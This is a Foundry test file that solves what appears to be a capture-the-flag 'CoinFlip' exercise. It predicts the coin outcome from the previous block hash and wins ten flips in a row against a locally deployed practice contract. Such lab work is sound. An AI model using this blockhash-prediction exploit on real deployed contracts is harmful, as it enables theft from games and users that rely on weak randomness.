// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/04-CoinFlip/CoinFlip.sol";

contract CoinFlipTest is Test {
    CoinFlip public target;
    address public player;

    function setUp() public {
        player = address(0x1);

        // Deploy contract
        target = new CoinFlip();

        console.log("=== Setup Complete ===");
        console.log("CoinFlip deployed at:", address(target));
        console.log("Player:", player);
    }

    /**
     * @notice Main exploit: Predict and win 10 times in a row
     */
    function testCompleteExploit() public {
        console.log("\n=== Complete Exploit ===");

        vm.startPrank(player);

        while (target.consecutiveWins() < 10) {
            // Predict the outcome
            uint256 blockValue = uint256(blockhash(block.number - 1));
            uint256 coinFlip = blockValue / (2**255);
            bool side = coinFlip == 1 ? true : false;

            // Call flip with the predicted side
            target.flip(side);

            uint256 consecutiveWins = target.consecutiveWins();
            console.log("Consecutive Wins:", consecutiveWins);
            vm.roll(block.number + 1);
        }
        assertEq(target.consecutiveWins(), 10);
        vm.stopPrank();
    }
}

